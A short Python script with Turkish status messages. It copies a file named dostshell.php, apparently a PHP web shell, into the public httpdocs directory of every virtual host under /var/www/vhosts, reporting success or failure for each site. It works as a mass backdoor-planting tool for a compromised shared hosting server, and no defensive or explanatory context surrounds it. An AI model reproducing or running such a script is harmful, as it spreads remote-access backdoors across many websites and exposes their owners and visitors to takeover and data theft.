import glob
import shutil

source_file = '/var/www/vhosts/dostshell.php'

for target_dir in glob.glob('/var/www/vhosts/*/httpdocs/'):
    try:
        shutil.copy(source_file, target_dir)
        print("{} kopyalandi -> {}".format(source_file, target_dir))
    except Exception as e:
        print("Hata: {} icine kopyalanamadi. {}".format(target_dir, e))
